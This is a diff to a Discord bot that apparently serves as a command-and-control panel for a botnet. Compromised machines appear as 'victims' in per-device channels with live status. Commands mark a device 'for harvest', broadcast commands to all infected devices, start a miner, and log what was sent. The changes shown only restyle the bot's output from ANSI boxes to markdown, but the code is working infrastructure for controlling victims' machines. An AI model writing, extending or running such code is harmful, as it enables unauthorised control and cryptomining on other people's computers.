@@ -6,7 +6,7 @@ import {
   StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
 } from 'discord.js'
 import { ICONS } from './icons.js'
-import { C, E, A, smallCaps, mono, createBox, bold, ts, randGif, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, barAnim, clockText, GIFS } from './utils/index.js'
+import { C, E, smallCaps, bold, ts, randGif, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, GIFS } from './utils/index.js'
 import { novaLogoEmbed } from './banner.js'
 import { videoStream } from './stream.js'
 import { aiCoPilot } from './ai-copilot/index.js'
@@ -299,13 +299,12 @@ function helpEmbed() {
   }
 }
 
-function victimListEmbed(status, onlineCount, totalCount, page = 1, totalPages = 1) {
+function victimListEmbed(desc, onlineCount, totalCount, page = 1, totalPages = 1) {
   return bloodEmbed(bold(`${E.sakura} VICTIMS: ${totalCount}`), onlineCount > 0 ? 'online' : 'offline',
-    `\`\`\`ansi\n${status}\n\`\`\``,
+    desc,
     { footer: `${smallCaps('page')} ${page}/${totalPages} ${E.sakura} ${onlineCount}/${totalCount} flowing`, noImage: true })
 }
 
-// ── Device Page Builder ─────────────────────────────────────────────────
 function buildDevicePages(guild) {
   const channels = getPhantomChannels(guild)
   const sorted = [...channels.values()].sort((a, b) => a.name.localeCompare(b.name, 'en'))
@@ -314,21 +313,19 @@ function buildDevicePages(guild) {
   const pages = []
   for (let i = 0; i < sorted.length; i += 5) {
     const slice = sorted.slice(i, i + 5)
-    const lines = [`${A.brightRed}${smallCaps('vessels of shinsenkyo')}${A.reset}`]
+    const lines = []
     for (const ch of slice) {
       const st = deviceStatus.get(ch.id)
       const on = st?.online ?? false
       const ago = st?.lastSeen ? `${Math.round((Date.now() - st.lastSeen) / 60000)}m` : '?'
-      const status = on ? `${A.green}${E.sparkles} FLOW${A.reset}` : `${A.grey}${E.coffin} FALLEN${A.reset}`
       const dot = on ? E.online : E.offline
-      lines.push(`${A.red}┃${A.reset} ${dot} ${mono(ch.name.replace('device-', ''))} ${on ? barAnim(1, 1, 5) : '░░░░░'} ${status} ${A.grey}(${ago})${A.reset}`)
+      lines.push(`${dot} **${ch.name.replace('device-', '')}** ${on ? '▰▰▰▰▰' : '▱▱▱▱▱'} ${on ? 'FLOW' : 'FALLEN'} \`${ago}\``)
     }
     const pct = sorted.length ? Math.round((onlineCount / sorted.length) * 100) : 0
-    lines.push('', `${A.green}◈ ${onlineCount}/${sorted.length} in flow ${E.sakura}(${pct}%)${A.reset}`)
-    const body = createBox(lines.join('\n'), 'neon', 40)
+    const desc = `${E.ghost} **${onlineCount}/${sorted.length} flowing** — ${pct}%\n\n${lines.join('\n')}`
     const p = Math.floor(i / 5) + 1
     const t = Math.ceil(sorted.length / 5)
-    const embed = victimListEmbed(body, onlineCount, sorted.length, p, t)
+    const embed = victimListEmbed(desc, onlineCount, sorted.length, p, t)
     const comps = sorted.length > 5 ? [...paginationRow(), ...MENU_BTNS] : MENU_BTNS
     pages.push({ embeds: embed.embeds, components: comps })
   }
@@ -497,7 +494,7 @@ client.on(Events.InteractionCreate, async (i) => {
             await new Promise(r => setTimeout(r, 2000))
             if ((await sendCmdLogged(item.ch, bcCmd, bcPayload, uid, user.username)).ok) sent++; else failed.push(item.name)
           }
-          return i.editReply({ ...bloodEmbed(bold('BROADCAST'), 'online', `\`\`\`ansi\n${createBox(`${A.brightRed}${smallCaps('broadcast')}${A.reset}\n${A.red}┃${A.reset} ${mono('!' + bcCmd + (bcPayload ? ' ' + bcPayload : ''))}\n${A.red}┃${A.reset} ${A.grey}sent: ${sent}/${channels.size}${A.reset}${failed.length ? '\n' + A.red + '┃' + A.reset + ' ' + A.grey + 'failed: ' + failed.join(', ') + A.reset : ''}`, 'neon', 36)}\`\`\``), components: RESULT_BTNS })
+          return i.editReply({ ...bloodEmbed(bold('BROADCAST'), 'online', `${E.knife} \`!${bcCmd}${bcPayload ? ' ' + bcPayload : ''}\`\n${E.check} Sent: ${sent}/${channels.size}${failed.length ? `\n${E.cross} Failed: ${failed.join(', ')}` : ''}`), components: RESULT_BTNS })
         }
         case 'history': return i.editReply({ ...bloodEmbed(bold('COMMAND HISTORY'), 'info', `\`\`\`${formatCommandLog(uid)}\n\`\`\``, { footer: `${smallCaps('last 15')} ⚡ ${ts()}` }), components: MENU_BTNS })
         case 'search': {
@@ -505,12 +502,8 @@ client.on(Events.InteractionCreate, async (i) => {
           await guild.channels.fetch()
           const matches = [...getPhantomChannels(guild).values()].filter(ch => ch.name.toLowerCase().includes(query))
           if (!matches.length) return i.editReply(`${E.coffin} No matches for "${query}" ${E.skull}`)
-          const lines = [`${A.brightCyan}${smallCaps('search results')}${A.reset}`]
-          for (const ch of matches) {
-            const st = deviceStatus.get(ch.id); const on = st?.online ?? false
-            lines.push(`${A.cyan}┃${A.reset} ${on ? E.online : E.offline} ${mono(ch.name)}`)
-          }
-          return i.editReply({ ...bloodEmbed(bold(`SEARCH: "${query}"`), 'warning', `\`\`\`ansi\n${createBox(lines.join('\n'), 'neon', 36)}\n\`\`\``, { footer: `${matches.length} result(s)` }), components: MENU_BTNS })
+          const searchLines = matches.map(ch => { const on = deviceStatus.get(ch.id)?.online ?? false; return `${on ? E.online : E.offline} **${ch.name}**` }).join('\n')
+          return i.editReply({ ...bloodEmbed(bold(`SEARCH: "${query}"`), 'warning', `${E.ghost} **${matches.length} result(s)**\n\n${searchLines}`), components: MENU_BTNS })
         }
         case 'send': {
           const cmd = options.getString('command').replace(/^!+/, '')
@@ -1080,7 +1073,7 @@ client.on(Events.MessageCreate, async (msg) => {
           const ch = findPhantomChannel(guild, args[0])
           if (!ch) return msg.reply(`${E.coffin} **${args[0]}** not found in Shinsenkyo ${E.skull}`)
           targets.set(uid, { chId: ch.id, ts: Date.now() })
-          return msg.reply({ ...bloodEmbed(bold('VESSEL MARKED'), 'warning', `\`\`\`ansi\n${createBox(`${A.brightRed}${smallCaps('marked for harvest')}${A.reset}\n${A.red}┃${A.reset} ${mono(ch.name)}`, 'neon', 36)}\`\`\``), components: RESULT_BTNS })
+          return msg.reply({ ...bloodEmbed(bold('VESSEL MARKED'), 'warning', `${E.target} **${ch.name}**`), components: RESULT_BTNS })
         }
         case '!untarget': {
           const had = targets.delete(uid)
@@ -1093,9 +1086,8 @@ client.on(Events.MessageCreate, async (msg) => {
           const query = args.join(' ').toLowerCase()
           const matches = [...getPhantomChannels(guild).values()].filter(ch => ch.name.toLowerCase().includes(query))
           if (!matches.length) return msg.reply(`${E.coffin} No matches for "${query}" ${E.skull}`)
-          const lines = [`${A.brightCyan}${smallCaps('results')}${A.reset}`]
-          for (const ch of matches) { const st = deviceStatus.get(ch.id); const on = st?.online ?? false; lines.push(`${A.cyan}┃${A.reset} ${on ? E.online : E.offline} ${mono(ch.name)}`) }
-          return msg.reply({ ...bloodEmbed(bold(`SEARCH: "${query}"`), 'warning', `\`\`\`ansi\n${createBox(lines.join('\n'), 'neon', 36)}\n\`\`\``, { footer: `${matches.length} result(s)` }), components: MENU_BTNS })
+          const searchLines = matches.map(ch => { const on = deviceStatus.get(ch.id)?.online ?? false; return `${on ? E.online : E.offline} **${ch.name}**` }).join('\n')
+          return msg.reply({ ...bloodEmbed(bold(`SEARCH: "${query}"`), 'warning', `${E.ghost} **${matches.length} result(s)**\n\n${searchLines}`), components: MENU_BTNS })
         }
         case '!broadcast': {
           const bc = args.join(' ').trim()
@@ -1119,7 +1111,7 @@ client.on(Events.MessageCreate, async (msg) => {
             await new Promise(r => setTimeout(r, 2000))
             if ((await sendCmdLogged(item.ch, bcCmd, bcPayload, uid, msg.author.username)).ok) sent++; else failed.push(item.name)
           }
-          return msg.reply({ ...bloodEmbed(bold('BROADCAST'), 'online', `\`\`\`ansi\n${createBox(`${A.brightRed}${smallCaps('broadcast')}${A.reset}\n${A.red}┃${A.reset} ${mono('!' + bcCmd + (bcPayload ? ' ' + bcPayload : ''))}\n${A.red}┃${A.reset} ${A.grey}sent: ${sent}/${channels.size}${A.reset}${failed.length ? '\n' + A.red + '┃' + A.reset + ' ' + A.grey + 'failed: ' + failed.join(', ') + A.reset : ''}`, 'neon', 36)}\`\`\``), components: RESULT_BTNS })
+          return msg.reply({ ...bloodEmbed(bold('BROADCAST'), 'online', `${E.knife} \`!${bcCmd}${bcPayload ? ' ' + bcPayload : ''}\`\n${E.check} Sent: ${sent}/${channels.size}${failed.length ? `\n${E.cross} Failed: ${failed.join(', ')}` : ''}`), components: RESULT_BTNS })
         }
         case '!miner': {
           await guild.channels.fetch()
@@ -1167,23 +1159,9 @@ client.on(Events.MessageCreate, async (msg) => {
           const uptimeStr = `${days}d ${hrs}h ${min}m ${sec}s`
           const shard = client.ws?.shards?.first()
           const chCount = client.channels.cache.filter(c => c.name?.startsWith('device-')).size
-          const lines = [
-            `${A.brightRed}${smallCaps('system')}${A.reset}`,
-            `${A.red}┃${A.reset} ${mono(`Uptime:    ${uptimeStr}`)}`,
-            `${A.red}┃${A.reset} ${mono(`Memory:    ${Math.round(mem.rss / 1024 / 1024)}MB`)}`,
-            `${A.red}┃${A.reset} ${mono(`Heap:      ${Math.round(mem.heapUsed / 1024 / 1024)}MB`)}`,
-            `${A.brightRed}${smallCaps('gateway')}${A.reset}`,
-            `${A.red}┃${A.reset} ${mono(`Ping:      ${client.ws?.ping ?? '?'}ms`)}`,
-            `${A.red}┃${A.reset} ${mono(`Shard:     ${shard ? `#${shard.id} [${shard.status}]` : 'N/A'}`)}`,
-            `${A.brightRed}${smallCaps('stats')}${A.reset}`,
-            `${A.red}┃${A.reset} ${mono(`Channels:  ${chCount}`)}`,
-            `${A.red}┃${A.reset} ${mono(`Devices:   ${client.channels.cache.filter(c => c.name?.startsWith('device-')).size}`)}`,
-            `${A.red}┃${A.reset} ${mono(`Targets:   ${targets.size}`)}`,
-          ]
+          const desc = `${E.clock} **Uptime:** ${uptimeStr}\n${E.brain} **Memory:** ${Math.round(mem.rss / 1024 / 1024)}MB (heap: ${Math.round(mem.heapUsed / 1024 / 1024)}MB)\n${E.satellite} **Ping:** ${client.ws?.ping ?? '?'}ms\n${E.sakura} **Shard:** ${shard ? `#${shard.id} [${shard.status}]` : 'N/A'}\n${E.ghost} **Channels:** ${chCount}\n${E.target} **Targets:** ${targets.size}`
           return msg.reply({
-            ...bloodEmbed(bold('GATEWAY VITALITY'), 'info',
-              `\`\`\`ansi\n${createBox(lines.join('\n'), 'neon', 40)}\n\`\`\``,
-               { footer: `🌸  ${ts()}  ─────────────────` }),
+            ...bloodEmbed(bold('GATEWAY VITALITY'), 'info', desc),
             components: MENU_BTNS
           })
         }
